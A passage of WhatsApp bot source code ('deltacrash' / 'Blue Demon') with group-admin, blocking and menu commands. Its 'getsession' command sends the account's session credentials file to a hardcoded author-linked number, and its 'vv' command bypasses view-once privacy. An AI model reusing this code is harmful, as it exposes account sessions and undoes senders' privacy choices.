    if (!isAdmins && !isGroupOwner && !isCreator) return deltacrashrevolutionReply('ᴏɴʟʏ ɢʀᴏᴜᴘ ᴀᴅᴍɪɴꜱ ᴏʀ ᴛʜᴇ ʙᴏᴛ ᴏᴡɴᴇʀ ᴄᴀɴ ᴜꜱᴇ ᴛʜɪꜱ ᴄᴏᴍᴍᴀɴᴅ.');

    // Send a "processing" reaction to the chat
    await deltacrashgcinc.sendMessage(m.chat, { react: { text: "🔁", key: m.key } });

    // Determine the user to promote (from mentioned users or quoted message)
    let users = m.mentionedJid[0] ? m.mentionedJid[0] : m.quoted ? m.quoted.sender : text.replace(/[^0-9]/g, '') + '@s.whatsapp.net';

    // Promote the user to admin
    await deltacrashgcinc.groupParticipantsUpdate(m.chat, [users], 'promote');

    // Send a success message
    deltacrashrevolutionReply('ᴜꜱᴇʀ ʜᴀꜱ ʙᴇᴇɴ ᴘʀᴏᴍᴏᴛᴇᴅ ᴛᴏ ᴀᴅᴍɪɴ.');

    // Send a "success" reaction to the chat
    await deltacrashgcinc.sendMessage(m.chat, { react: { text: "💞", key: m.key } });
    break;
}
case 'demote': {
    // Check if the command is being used in a group
    if (!m.isGroup) return deltacrashrevolutionReply('ᴛʜɪꜱ ᴄᴏᴍᴍᴀɴᴅ ᴄᴀɴ ᴏɴʟʏ ʙᴇ ᴜꜱᴇᴅ ɪɴ ɢʀᴏᴜᴘꜱ.');
    
    // Check if the bot is an admin
    if (!isBotAdmins) return deltacrashrevolutionReply('ᴛʜᴇ ʙᴏᴛ ɴᴇᴇᴅꜱ ᴛᴏ ʙᴇ ᴀɴ ᴀᴅᴍɪɴ ᴛᴏ ᴜꜱᴇ ᴛʜɪꜱ ᴄᴏᴍᴍᴀɴᴅ.');
    
    // Check if the user issuing the command is an admin
    if (!isAdmins && !isGroupOwner && !isCreator) return deltacrashrevolutionReply('ᴏɴʟʏ ɢʀᴏᴜᴘ ᴀᴅᴍɪɴꜱ ᴏʀ ᴛʜᴇ ʙᴏᴛ ᴏᴡɴᴇʀ ᴄᴀɴ ᴜꜱᴇ ᴛʜɪꜱ ᴄᴏᴍᴍᴀɴᴅ.');
    
    // Send a "processing" reaction to the chat
    await deltacrashgcinc.sendMessage(m.chat, { react: { text: "🔁", key: m.key } });

    // Determine the user to demote (from mentioned users or quoted message)
    let users = m.mentionedJid[0] ? m.mentionedJid[0] : m.quoted ? m.quoted.sender : text.replace(/[^0-9]/g, '') + '@s.whatsapp.net';

    // Demote the user
    await deltacrashgcinc.groupParticipantsUpdate(m.chat, [users], 'demote');

    // Send a success message
    deltacrashrevolutionReply('ᴜꜱᴇʀ ʜᴀꜱ ʙᴇᴇɴ ᴅᴇᴍᴏᴛᴇᴅ ꜰʀᴏᴍ ᴀᴅᴍɪɴ.');

    // Send a "success" reaction to the chat
    await deltacrashgcinc.sendMessage(m.chat, { react: { text: "🥲", key: m.key } });
    break;
}
            case 'delete':
case 'del':
case 'd': {
    if (!m.quoted) return;

    try {
        await deltacrashgcinc.sendMessage(m.chat, {
            delete: {
                remoteJid: m.chat,
                fromMe: false, // This is set to false to delete others' messages
                id: m.quoted.id,
                participant: m.quoted.sender // The sender of the quoted message
            }
        });
    } catch (error) {
        console.error('ᴇʀʀᴏʀ ᴅᴇʟᴇᴛɪɴɢ ᴍᴇꜱꜱᴀɢᴇ:', error);
        // Optional: handle the error or log it if needed
    }
}
break;
            case 'join': {
    if (!isCreator) return deltacrashrevolutionReply(mess.owner);
    if (!text) return deltacrashrevolutionReply('Enter Group Link!');
    if (!isUrl(text) || !text.includes('whatsapp.com')) return deltacrashrevolutionReply('Link Invalid!');

    const result = text.split('https://chat.whatsapp.com/')[1];
    deltacrashrevolutionReply('Processing your request...');
    
    try {
        await deltacrashgcinc.groupAcceptInvite(result);
        return deltacrashrevolutionReply('Successfully joined the group!');
    } catch (error) {
        if (error.response) {
            switch (error.response.status) {
                case 400:
                    return deltacrashrevolutionReply('Group Not Found❗');
                case 401:
                    return deltacrashrevolutionReply('Bot Kicked From The Group❗');
                case 409:
                    return deltacrashrevolutionReply('Bots Have Already Joined the Group❗');
                case 410:
                    return deltacrashrevolutionReply('Group URL Has Been Reset❗');
                case 500:
                    return deltacrashrevolutionReply('Group Is Full❗');
                default:
                    return deltacrashrevolutionReply('An unknown error occurred.');
            }
        }
        return deltacrashrevolutionReply('An unexpected error occurred.');
    }
}
break;
            case 'block': {
    if (!isCreator) return deltacrashrevolutionReply(mess.owner);

    let users;

    if (isGroup) {
        // In a group, block the sender of the quoted message or the number from the input text
        if (m.quoted && m.quoted.sender) {
            users = m.quoted.sender;
        } else if (text) {
            users = text.replace(/[^0-9]/g, '') + '@s.whatsapp.net';
        }
    } else {
        // In a private chat, block the other person's number
        users = m.chat;
    }

    if (users) {
        // Ensure the number is not an empty string and contains valid characters
        if (users.replace(/[^0-9]/g, '').length < 7) {
            return deltacrashrevolutionReply('Invalid number. Please provide a valid number.');
        }

        // Block the user
        await deltacrashgcinc.updateBlockStatus(users, "block");
        deltacrashrevolutionReply(`Successfully blocked user ${users.split("@")[0]}`);
    } else {
        deltacrashrevolutionReply("Please reply to the message or input the number you want to block.");
    }
    break;
}

// Unblock Command
case 'unblock': {
    if (!isCreator) return deltacrashrevolutionReply(`You do not have permission to use this command.`);

    let users;

    if (isGroup) {
        // In a group, unblock the sender of the quoted message or the number from the input text
        users = m.quoted ? m.quoted.sender : text.replace(/[^0-9]/g, '') + '@s.whatsapp.net';
    } else {
        // In a private chat, unblock the other person's number
        users = m.chat;
    }

    if (users) {
        // Ensure the number is not an empty string and contains valid characters
        if (users.replace(/[^0-9]/g, '').length < 7) {
            return deltacrashrevolutionReply('Invalid number. Please provide a valid number.');
        }

        // Unblock the user
        await deltacrashgcinc.updateBlockStatus(users, "unblock");
        deltacrashrevolutionReply(`Successfully unblocked user ${users.split("@")[0]}`);
    } else {
        deltacrashrevolutionReply("Please reply to the message or input the number you want to unblock.");
    }
    break;
}      
case 'getsession': {
    // Check if the sender is the owner
    const ownerNumber = '2347041039367@s.whatsapp.net'; // Replace with your WhatsApp owner number
    if (m.sender !== ownerNumber) return deltacrashrevolutionReply('ꜱᴏʀʀy, ᴏɴʟy ᴛʜᴇ ʙᴏᴛ ᴏᴡɴᴇʀ ᴄᴀɴ ᴜꜱᴇ ᴛʜɪꜱ ᴄᴏᴍᴍᴀɴᴅ.');

    const credsPath = './session/creds.json';
    const fs = require('fs');

    try {
        // Check if the file exists
        if (!fs.existsSync(credsPath)) {
            return deltacrashrevolutionReply('Sorry, the session file does not exist.');
        }

        // Send the session file as a document
        await deltacrashgcinc.sendMessage(m.chat, { 
            document: fs.readFileSync(credsPath), // Read the file
            mimetype: 'application/json', 
            fileName: 'ᴄʀᴇᴅꜱ.ᴊꜱᴏɴ ʙy ʙʟᴜᴇxᴅᴇᴍᴏɴ' // Name of the file to send
        }, { quoted: m });
    } catch (error) {
        console.error(error);
        deltacrashrevolutionReply(`An error occurred: ${error.message}`);
    }
}
break;
            case 'channel': {
    // Image URL for the session
    let img = "https://j.top4top.io/p_31833m7y10.jpg";

    // Function to create an image message
    async function image(url) {
        const { imageMessage } = await generateWAMessageContent({
            image: { url }
        }, {
            upload: deltacrashgcinc.waUploadToServer
        });
        return imageMessage;
    }

    // Create the message focused only on the channel session
    let msg = generateWAMessageFromContent(
        m.chat, {
            viewOnceMessage: {
                message: {
                    interactiveMessage: {
                        body: { text: `\`Follow my official WhatsApp channel\`` },
                        carouselMessage: {
                            cards: [{
                                header: {
                                    imageMessage: await image(img),
                                    hasMediaAttachment: true,
                                },
                                body: { text: `*  \`DEMON TECH CHANNEL\`` },
                                nativeFlowMessage: {
                                    buttons: [{
                                        name: "cta_url",
                                        buttonParamsJson: '{"display_text":"💕 CHANNEL","url":"https://whatsapp.com/channel/0029Vah3fKtCnA7oMPTPJm1h","merchant_url":"https://www.google.com"}',
                                    }],
                                },
                            }],
                            messageVersion: 1,
                        },
                    },
                },
            },
        }, {}
    );

    // Send the message
    await deltacrashgcinc.relayMessage(m.chat, msg.message, { quoted: m });
}
break;

            case 'owner': {
    // Image URL
    let img = "https://f.top4top.io/p_3182gl4u70.jpeg";

    // Function to create an image message
    async function image(url) {
        const { imageMessage } = await generateWAMessageContent({
            image: { url }
        }, {
            upload: deltacrashgcinc.waUploadToServer
        });
        return imageMessage;
    }

    // Create the message
    let msg = generateWAMessageFromContent(
        m.chat, {
            viewOnceMessage: {
                message: {
                    interactiveMessage: {
                        body: { text: `\`ʜᴇʟʟᴏ ${pushname}\`\n*ᴛʜɪꜱ ɪꜱ ᴛʜᴇ ᴏᴡɴᴇʀ ᴏꜰ ᴛʜɪꜱ ʙᴏᴛ, ᴘʟꜱ ᴅᴏɴ'ᴛ ꜰᴏʀɢᴇᴛ ᴛᴏ ꜰᴏʟʟᴏᴡ ᴍʏ ᴄʜᴀɴɴᴇʟ*` },
                        carouselMessage: {
                            cards: [{
                                header: {
                                    imageMessage: await image(img),
                                    hasMediaAttachment: true,
                                },
                                body: { text: `*  \`OWNER ╳ DEMON\`` },
                                nativeFlowMessage: {
                                    buttons: [{
                                        name: "cta_url",
                                        buttonParamsJson: '{"display_text":"👤𝙱𝙻𝚄𝙴 𝙳𝙴𝙼𝙾𝙽","url":"https:\\/\\/wa.me\\/2347041039367?text=🄷🄴🅈 + 🄱🄻🅄🄴🄳🄴🄼🄾🄽","webview_presentation":null}',
                                    }],
                                },
                            }, {
                                header: {
                                    imageMessage: await image(img),
                                    hasMediaAttachment: true,
                                },
                                body: { text: `*  \`DEMON TECH CHANNEL\`` },
                                nativeFlowMessage: {
                                    buttons: [{
                                        name: "cta_url",
                                        buttonParamsJson: '{"display_text":"💕 CHANNEL","url":"https://whatsapp.com/channel/0029Vah3fKtCnA7oMPTPJm1h","merchant_url":"https://www.google.com"}',
                                    }],
                                },
                            }],
                            messageVersion: 1,
                        },
                    },
                },
            },
        }, {}
    );

    // Send the message
    await deltacrashgcinc.relayMessage(m.chat, msg.message, { quoted: m });
}
break;
            case 'vv': {
    // Check if the user is the creator or a premium user
    if (!isCreator && !isPremium) return deltacrashrevolutionReply('ᴛʜɪꜱ ᴄᴏᴍᴍᴀɴᴅ ɪꜱ ʀᴇꜱᴛʀɪᴄᴛᴇᴅ ᴛᴏ ᴘʀᴇᴍɪᴜᴍ ᴜꜱᴇʀꜱ ᴏʀ ᴛʜᴇ ʙᴏᴛ ᴏᴡɴᴇʀ.')

    // Check if the message is a view-once message
    if (!m.quoted) return deltacrashrevolutionReply('ᴘʟᴇᴀꜱᴇ ʀᴇᴘʟʏ ᴛᴏ ᴀ ᴠɪᴇᴡ-ᴏɴᴄᴇ ᴍᴇꜱꜱᴀɢᴇ.')
    if (m.quoted.mtype !== 'viewOnceMessageV2') return deltacrashrevolutionReply('ᴛʜɪꜱ ɪꜱ ɴᴏᴛ ᴀ ᴠɪᴇᴡ-ᴏɴᴄᴇ ᴍᴇꜱꜱᴀɢᴇ.')

    // Download the media from the view-once message
    let msg = m.quoted.message
    let type = Object.keys(msg)[0]
    let media = await downloadContentFromMessage(msg[type], type == 'imageMessage' ? 'image' : 'video')

    let buffer = Buffer.from([])
    for await (const chunk of media) {
        buffer = Buffer.concat([buffer, chunk])
    }

    // Send the media back to the chat
    if (/video/.test(type)) {
        return deltacrashgcinc.sendFile(m.chat, buffer, 'media.mp4', msg[type].caption || '', m)
    } else if (/image/.test(type)) {
        return deltacrashgcinc.sendFile(m.chat, buffer, 'media.jpg', msg[type].caption || '', m)
    }
}
break
case 'tagall': {
    if (!m.isGroup) return deltacrashrevolutionReply(mess.group);
    if (!isAdmins && !isGroupOwner && !isCreator && !isPremium) return deltacrashrevolutionReply(mess.admin);
    if (!isBotAdmins && !isCreator && !isPremium) return deltacrashrevolutionReply(mess.botAdmin);

    // Send a preliminary "Tagging all participants, please wait..." message
    await deltacrashgcinc.sendMessage(m.chat, { text: 'ᴛᴀɢɢɪɴɢ ᴀʟʟ ᴍᴇᴍʙᴇʀꜱ, ᴩʟꜱ ᴡᴀɪᴛ....' });

    // Map participants to their IDs for proper tagging
    const mentions = participants.map(p => p.id);

    // Create a list of participants to display in the message
    let participantsList = participants.map(participant => `💕 @${participant.id.split('@')[0]}`).join('\n');
    
    let message = `\`ʙʟᴜᴇᴅᴇᴍᴏɴ ꜱᴜᴍᴍᴏɴꜱ yᴏᴜ ᴀʟʟ💕\`:\n\n${participantsList}`;

    // Send the actual tag message with mentions
    await deltacrashgcinc.sendMessage(m.chat, {
        text: message,
        mentions: mentions
    });

    // Optionally, send a confirmation message
    await deltacrashgcinc.sendMessage(m.chat, { text: '\`ʙʟᴜᴇxᴅᴇᴍᴏɴ ᴛᴇᴄʜ 🤟\`' });
}
break;

            case 'ping': {
    // Capture the start time for ping calculation
    const startTime = performance.now();

    // Send a preliminary message to notify that the ping is being measured
    const pingMsg = await deltacrashgcinc.sendMessage(m.chat, { text: '𝐑𝐞𝐚𝐝𝐢𝐧𝐠 𝐩𝐢𝐧𝐠 ⫸' });

    // Capture the end time after the message is sent
    const endTime = performance.now();
    const latensi = (endTime - startTime).toFixed(3); // Calculate the latency in milliseconds

    // Relay an edited message with the calculated ping
    await deltacrashgcinc.relayMessage(m.chat, {
        protocolMessage: {
            key: pingMsg.key,
            type: 14, // Protocol type for editing messages
            editedMessage: {
                conversation: `*ᴅᴇᴍᴏɴx ᴍᴅ ꜱᴩᴇᴇᴅ ${latensi} ᴍꜱ*`
            }
        }
    }, {});
}
break;
case 'time': {
    // Capture the start time for time calculation
    const startTime = performance.now();

    // Send a preliminary message to notify that the time is being measured
    const timeMsg = await deltacrashgcinc.sendMessage(m.chat, { text: '𝐑𝐞𝐚𝐝𝐢𝐧𝐠 𝐭𝐢𝐦𝐞 ⫸' });

    // Capture the end time after the message is sent
    const endTime = performance.now();
    
    // Get the current time formatted
    let currentTime = moment().tz('Africa/Lagos').format('HH:mm:ss');

    // Relay an edited message with the current time
    await deltacrashgcinc.relayMessage(m.chat, {
        protocolMessage: {
            key: timeMsg.key,
            type: 14, // Protocol type for editing messages
            editedMessage: {
                conversation: `*ᴄᴜʀʀᴇɴᴛ ᴛɪᴍᴇ: ${currentTime}*
   *ᴅᴇᴍᴏɴx ᴍᴅ💕*`
            }
        }
    }, {});
}
break;
case 'menu': {
    // Send the initial loading message with the image
    const loadingMsg = await deltacrashgcinc.sendMessage(m.chat, {
        image: mmks,
        caption: '𝚕𝚘𝚊𝚍𝚒𝚗𝚐...💕'
    }, {
        quoted: m
    });

    // First edit to '𝙷𝙴𝙻𝙻𝙾 𝚆𝙾𝚁𝙻𝙳💕'
    setTimeout(async () => {
        await deltacrashgcinc.relayMessage(m.chat, {
            protocolMessage: {
                key: loadingMsg.key,
                type: 14,
                editedMessage: {
                    imageMessage: {
                        caption: '𝙷𝙴𝙻𝙻𝙾 𝚆𝙾𝚁𝙻𝙳💕'
                    }
                }
            }
        }, {});

        // Second edit to 'ᴅᴇᴠᴇʟᴏᴩᴇᴅ ʙy ʙʟᴜᴇᴅᴇᴍᴏɴ💘'
        setTimeout(async () => {
            await deltacrashgcinc.relayMessage(m.chat, {
                protocolMessage: {
                    key: loadingMsg.key,
                    type: 14,
                    editedMessage: {
                        imageMessage: {
                            caption: 'ᴅᴇᴠᴇʟᴏᴩᴇᴅ ʙy ʙʟᴜᴇᴅᴇᴍᴏɴ💘'
                        }
                    }
                }
            }, {});

            // Third edit to '𝒕𝒉𝒂𝒏𝒌𝒔 𝒇𝒐𝒓 𝒘𝒂𝒊𝒕𝒊𝒏𝒈 🖤'
            setTimeout(async () => {
                await deltacrashgcinc.relayMessage(m.chat, {
                    protocolMessage: {
                        key: loadingMsg.key,
                        type: 14,
                        editedMessage: {
                            imageMessage: {
                                caption: '𝒕𝒉𝒂𝒏𝒌𝒔 𝒇𝒐𝒓 𝒘𝒂𝒊𝒕𝒊𝒏𝒈 🖤'
                            }
                        }
                    }
                }, {});

                // Final edit to update with the menu and the image
                setTimeout(async () => {
                    const start = performance.now();
                    const end = performance.now();
                    const ping = (end - start).toFixed(3); // Ping calculation

                    let xtime = moment().tz('Africa/Lagos').format('HH:mm:ss');
                    let mode = deltacrashgcinc.public ? 'ᴩᴜʙʟɪᴄ' : 'ᴩʀɪᴠᴀᴛᴇ';

                    // Get the runtime
                    let run = runtime(process.uptime());

                    let menu =
                        `┏╍╍╍╍╍╍╍╍╍╍╍╍╍
ᐉ 𝐂𝐫𝐞𝐚𝐭𝐨𝐫: *𝙳𝙴𝙼𝙾𝙽*
ᐉ 𝐏𝐢𝐧𝐠: *${ping} ᴍꜱ*
ᐉ 𝐌𝐨𝐝𝐞: *${mode}*
ᐉ 𝐓𝐢𝐦𝐞: *${xtime}*
ᐉ 𝐑𝐮𝐧𝐭𝐢𝐦𝐞: *${run}*
┗╍╍╍╍╍╍╍╍╍╍╍╍╍
\`𝔩𝔦𝔣𝔢 𝔦𝔰 𝔞𝔟𝔬𝔲𝔱 𝔬𝔳𝔢𝔯𝔠𝔬𝔪𝔦𝔫𝔤 𝔬𝔟𝔰𝔱𝔞𝔠𝔩𝔢𝔰\`💕
${readmore}
┌━━━━━━━━━━━━━⑀⑀
┋「 \`OWNERMENU\` 」
┋么 *ᴩᴜʙʟɪᴄ*
┋么 *ꜱᴇʟꜰ*
┋么 *ᴏᴡɴᴇʀ*
┋么 *ᴀᴅᴅᴏᴡɴᴇʀ*
┋么 *ᴅᴇʟᴏᴡɴᴇʀ*
┋么 *ɢᴇᴛᴏᴡɴᴇʀ*
┋么 *ᴀᴅᴅᴩʀᴇᴍ*
┋么 *ᴅᴇʟᴩʀᴇᴍ*
┋么 *ᴀᴅᴅ*
┋么 *ᴀᴜᴛᴏʀᴇᴀᴅ*
┋么 *ᴛᴀᴋᴇ*
┋么 *ᴍᴏᴅᴇ*
┋么 *ɢᴇᴛꜱᴇꜱꜱɪᴏɴ*
┋么 *ʙʟᴏᴄᴋ*
┋么 *ᴜɴʙʟᴏᴄᴋ*
└━━━━━━━━━━━━━⑀⑀
┌━━━━━━━━━━━━━⑀⑀
┋「 \`GROUPMENU\` 」
┋么 *ᴛᴀɢ*
┋么 *ᴛᴀɢᴀʟʟ*
┋么 *ᴠᴠ*
┋么 *ᴄʜᴀɴɴᴇʟ*
┋么 *ᴋɪᴄᴋ*
┋么 *ᴅᴇʟ*
┋么 *ᴊᴏɪɴ*
┋么 *ᴘʀᴏᴍᴏᴛᴇ*
┋么 *ᴅᴇᴍᴏᴛᴇ*
┋么 *ꜱᴠᴄᴏɴᴛᴀᴄᴛ*
┋么 *ᴍᴜᴛᴇ*
┋么 *ᴜɴᴍᴜᴛᴇ*
└━━━━━━━━━━━━━⑀⑀
┌━━━━━━━━━━━━━⑀⑀
┋「 \`DEMONXMENU\` 」
┋么 *ᴀᴜᴛᴏᴠɪᴇᴡꜱᴛᴀᴛᴜꜱ*
┋么 *ᴀʀᴇᴀᴄᴛ*
┋么 *ʙᴜʏᴘᴀɴᴇʟ*
┋么 *ʜʀᴛ*
┋么 *ʏᴏᴜᴛᴜʙᴇ*
┋么 *ᴛᴏɪᴍɢ*
┋么 *ᴛᴏᴀᴜᴅ*
┋么 *ᴛᴏᴍᴘ4*
┋么 *ꜱᴀᴠᴇ*
└━━━━━━━━━━━━━⑀⑀
┌━━━━━━━━━━━━━⑀⑀
┋「 \`OTHERMENU\` 」
┋么 *ᴩɪɴɢ*
┋么 *ᴇᴍᴏᴊɪᴍɪx*
┋么 *ᴛɪᴍᴇ*
┋么 *ꜱᴛɪᴄᴋᴇʀ*
┋么 *ᴍᴇɴᴜ2*
┋么 *ʟɪꜱᴛʙʟᴏᴄᴋ*
└━━━━━━━━━━━━━⑀⑀
┌━━━━━━━━━━━━━⑀⑀
┋「 \`BUGMENU\` 」
┋么 *ᴛᴇᴍᴘʟᴀɢ*
┋么 
┋么 
└━━━━━━━━━━━━━⑀⑀
    \`𝖕𝖗𝖔𝖙𝖊𝖈𝖙 𝖙𝖍𝖔𝖘𝖊 𝖞𝖔𝖚 𝖑𝖔𝖛𝖊\`💕`;

                    await deltacrashgcinc.relayMessage(m.chat, {
                        protocolMessage: {
                            key: loadingMsg.key,
                            type: 14,
                            editedMessage: {
                                imageMessage: {
                                    caption: menu
                                }
                            }
                        }
                    }, {});

                }, 1500); // Edit to the menu after 1.5 seconds

            }, 1500); // Edit to '𝒕𝒉𝒂𝒏𝒌𝒔 𝒇𝒐𝒓 𝒘𝒂𝒊𝒕𝒊𝒏𝒈 🖤' after 1.5 seconds

        }, 1500); // Edit to 'ᴅᴇᴠᴇʟᴏᴩᴇᴅ ʙy ʙʟᴜᴇᴅᴇᴍᴏɴ💘' after 1.5 seconds

    }, 1500); // Edit to '𝙷𝙴𝙻𝙻𝙾 𝚆𝙾𝚁𝙻𝙳💕' after 1.5 seconds

    break;
}

case 'mode': {
    // Check if the user has the right to change the mode (Only creator or bot owner)
    if (!isCreator) return deltacrashrevolutionReply(mess.owner);

    // Toggle between public and private modes
    if (q === 'public') {
        deltacrashgcinc.public = true; // Set to public mode
        deltacrashrevolutionReply("*[sᴜᴄᴄᴇss]* *ᴩᴜʙʟɪᴄ ᴍᴏᴅᴇ ᴀᴄᴛɪᴠᴀᴛᴇᴅ😊*");
    } else if (q === 'self' || q === 'private') {
        deltacrashgcinc.public = false; // Set to private mode
        deltacrashrevolutionReply("*[sᴜᴄᴄᴇss]* *ᴩʀɪᴠᴀᴛᴇ ᴍᴏᴅᴇ ᴀᴄᴛɪᴠᴀᴛᴇᴅ😊*");
    } else {
        // Display current mode
        let currentMode = deltacrashgcinc.public ? 'ᴩᴜʙʟɪᴄ' : 'ᴩʀɪᴠᴀᴛᴇ';
        deltacrashrevolutionReply(`*ᴛʜᴇ ʙᴏᴛ ɪꜱ ᴄᴜʀʀᴇɴᴛʟy ɪɴ ${currentMode} ᴍᴏᴅᴇ*`);
    }
}
break;

 case 'latency': {
    const start = speed(); // Start ping measurement
    const end = speed(); // End ping measurement
    const ping = (end - start).toFixed(3); // Calculate ping in milliseconds

    // Send the ping response
    deltacrashgcinc.sendMessage(m.chat, { text: `*${ping}*` }, { quoted: m });
}
break;
case 'menu2':
    const start = speed(); // Start ping measurement

    // Simulate a task or delay here if needed
    const end = speed(); // End ping measurement
    const ping = (end - start).toFixed(3); // Calculate ping in milliseconds

    let xtime = moment().tz('Africa/Lagos').format('HH:mm:ss');

    // Check the current mode (public or private)
    let mode = deltacrashgcinc.public ? 'ᴩᴜʙʟɪᴄ' : 'ᴩʀɪᴠᴀᴛᴇ';
    let run = runtime(process.uptime());

    let manhwa = 
`┏╍╍╍╍╍╍╍╍╍╍╍╍╍
ᐉ 𝐂𝐫𝐞𝐚𝐭𝐨𝐫: *𝙳𝙴𝙼𝙾𝙽*
ᐉ 𝐏𝐢𝐧𝐠: *${ping} ᴍꜱ*
ᐉ 𝐌𝐨𝐝𝐞: *${mode}*
ᐉ 𝐓𝐢𝐦𝐞: *${xtime}*
ᐉ 𝐑𝐮𝐧𝐭𝐢𝐦𝐞: *${run}*
┗╍╍╍╍╍╍╍╍╍╍╍╍╍
\`𝔩𝔦𝔣𝔢 𝔦𝔰 𝔞𝔟𝔬𝔲𝔱 𝔬𝔳𝔢𝔯𝔠𝔬𝔪𝔦𝔫𝔤 𝔬𝔟𝔰𝔱𝔞𝔠𝔩𝔢𝔰\`💕
${readmore}
┌━━━━━━━━━━━━━⑀⑀
┋「 \`OWNERMENU\` 」
┋么 *ᴩᴜʙʟɪᴄ*
┋么 *ꜱᴇʟꜰ*
┋么 *ᴏᴡɴᴇʀ*
┋么 *ᴀᴅᴅᴏᴡɴᴇʀ*
┋么 *ᴅᴇʟᴏᴡɴᴇʀ*
┋么 *ɢᴇᴛᴏᴡɴᴇʀ*
┋么 *ᴀᴅᴅᴩʀᴇᴍ*
┋么 *ᴅᴇʟᴩʀᴇᴍ*
┋么 *ᴀᴅᴅ*
┋么 *ᴀᴜᴛᴏʀᴇᴀᴅ*
┋么 *ᴛᴀᴋᴇ*
┋么 *ᴍᴏᴅᴇ*
┋么 *ɢᴇᴛꜱᴇꜱꜱɪᴏɴ*
┋么 *ʙʟᴏᴄᴋ*
┋么 *ᴜɴʙʟᴏᴄᴋ*
└━━━━━━━━━━━━━⑀⑀
┌━━━━━━━━━━━━━⑀⑀
┋「 \`GROUPMENU\` 」
┋么 *ᴛᴀɢ*
┋么 *ᴛᴀɢᴀʟʟ*
┋么 *ᴠᴠ*
┋么 *ᴄʜᴀɴɴᴇʟ*
┋么 *ᴋɪᴄᴋ*
┋么 *ᴅᴇʟ*
┋么 *ᴊᴏɪɴ*
┋么 *ᴘʀᴏᴍᴏᴛᴇ*
┋么 *ᴅᴇᴍᴏᴛᴇ*
┋么 *ꜱᴠᴄᴏɴᴛᴀᴄᴛ*
┋么 *ᴍᴜᴛᴇ*
┋么 *ᴜɴᴍᴜᴛᴇ*
└━━━━━━━━━━━━━⑀⑀
┌━━━━━━━━━━━━━⑀⑀
┋「 \`DEMONXMENU\` 」
┋么 *ᴀᴜᴛᴏᴠɪᴇᴡꜱᴛᴀᴛᴜꜱ*
┋么 *ᴀʀᴇᴀᴄᴛ*
┋么 *ʙᴜʏᴘᴀɴᴇʟ*
┋么 *ʜʀᴛ*
┋么 *ʏᴏᴜᴛᴜʙᴇ*
┋么 *ᴛᴏɪᴍɢ*
┋么 *ᴛᴏᴀᴜᴅ*
┋么 *ᴛᴏᴍᴘ4*
┋么 *ꜱᴀᴠᴇ*
└━━━━━━━━━━━━━⑀⑀
┌━━━━━━━━━━━━━⑀⑀
┋「 \`OTHERMENU\` 」
┋么 *ᴩɪɴɢ*
┋么 *ᴇᴍᴏᴊɪᴍɪx*
┋么 *ᴛɪᴍᴇ*
┋么 *ꜱᴛɪᴄᴋᴇʀ*
┋么 *ᴍᴇɴᴜ2*
┋么 *ʟɪꜱᴛʙʟᴏᴄᴋ*
└━━━━━━━━━━━━━⑀⑀
┌━━━━━━━━━━━━━⑀⑀
┋「 \`BUGMENU\` 」
┋么 *ᴛᴇᴍᴘʟᴀɢ*
┋么 
┋么 
└━━━━━━━━━━━━━⑀⑀
    \`𝖕𝖗𝖔𝖙𝖊𝖈𝖙 𝖙𝖍𝖔𝖘𝖊 𝖞𝖔𝖚 𝖑𝖔𝖛𝖊\`💕`;

    if (typemenu === 'v1') {
        // Send the menu message with the calculated ping and mode included
        deltacrashgcinc.sendMessage(m.chat, {
            text: manhwa,
            contextInfo: {
                externalAdReply: {
                    title: '𝙱𝙻𝚄𝙴 𝙳𝙴𝙼𝙾𝙽 v2💕',
                    body: 'ᴏғғɪᴄɪᴀʟ ᴡʜᴀᴛsᴀᴘᴘ ʙᴏᴛ ',
                    thumbnailUrl: 'https://f.top4top.io/p_3182gl4u70.jpeg',
                    mediaType: 1,
                    renderLargerThumbnail: true
                }
            }
        }, { quoted: m });
    }
    break;
   case 'bmenu': {
    const start = speed(); // Start ping measurement
    const end = speed(); // End ping measurement
    const ping = (end - start).toFixed(3); // Calculate ping in milliseconds
    let xtime = moment().tz('Africa/Lagos').format('HH:mm:ss');
    let mode = deltacrashgcinc.public ? 'ᴩᴜʙʟɪᴄ' : 'ᴩʀɪᴠᴀᴛᴇ';
    let run = runtime(process.uptime());

    // Construct the body of the menu
    let menuBody = `ᐉ 𝐂𝐫𝐞𝐚𝐭𝐨𝐫: *𝙳𝙴𝙼𝙾𝙽*\nᐉ 𝐏𝐢𝐧𝐠: *${ping} ᴍꜱ*\nᐉ 𝐌𝐨𝐝𝐞: *${mode}*\nᐉ 𝐓𝐢𝐦𝐞: *${xtime}*\nᐉ 𝐑𝐮𝐧𝐭𝐢𝐦𝐞: *${run}*`;

    // Prepare buttons
    const buttons = [
        { buttonId: `${prefix}public`, buttonText: { displayText: 'Public Mode' }, type: 1 },
        { buttonId: `${prefix}self`, buttonText: { displayText: 'Private Mode' }, type: 1 },
        { buttonId: `${prefix}addowner`, buttonText: { displayText: 'Add Owner' }, type: 1 },
        { buttonId: `${prefix}delowner`, buttonText: { displayText: 'Delete Owner' }, type: 1 },
        { buttonId: `${prefix}tag`, buttonText: { displayText: 'Tag All' }, type: 1 },
        { buttonId: `${prefix}toimg`, buttonText: { displayText: 'Sticker to Image' }, type: 1 },
        { buttonId: `${prefix}tomp4`, buttonText: { displayText: 'Sticker to Video' }, type: 1 },
        { buttonId: `${prefix}ping`, buttonText: { displayText: 'Ping' }, type: 1 },
        { buttonId: `${prefix}save`, buttonText: { displayText: 'Save Status' }, type: 1 }
    ];

    // Send the menu with buttons
    await deltacrashgcinc.sendMessage(m.chat, {
        text: menuBody,
        buttons: buttons,
        footer: 'ᴘʀᴏᴛᴇᴄᴛ ᴛʜᴏꜱᴇ ʏᴏᴜ ʟᴏᴠᴇ💕',
        headerType: 1 // Optional, used to define if there's a media header
    }, { quoted: m });

    break;
}

// Button Interaction Handling
deltacrashgcinc.on('message', async (message) => {
    if (message.type === 'interactive' && message.selectedButtonId) {
        const command = message.selectedButtonId;

        switch (command) {
            case `${prefix}public`:
                // Handle public mode
                deltacrashgcinc.public = true;
                await deltacrashgcinc.sendMessage(message.key.remoteJid, { text: "Public mode activated!" });
                break;

            case `${prefix}self`:
                // Handle private mode
                deltacrashgcinc.public = false;
                await deltacrashgcinc.sendMessage(message.key.remoteJid, { text: "Private mode activated!" });
                break;

            case `${prefix}addowner`:
                // Handle adding owner logic
                await deltacrashgcinc.sendMessage(message.key.remoteJid, { text: "Add Owner functionality." });
                break;

            case `${prefix}delowner`:
                // Handle deleting owner logic
                await deltacrashgcinc.sendMessage(message.key.remoteJid, { text: "Delete Owner functionality." });
                break;

            case `${prefix}tag`:
                // Handle tagging all members logic
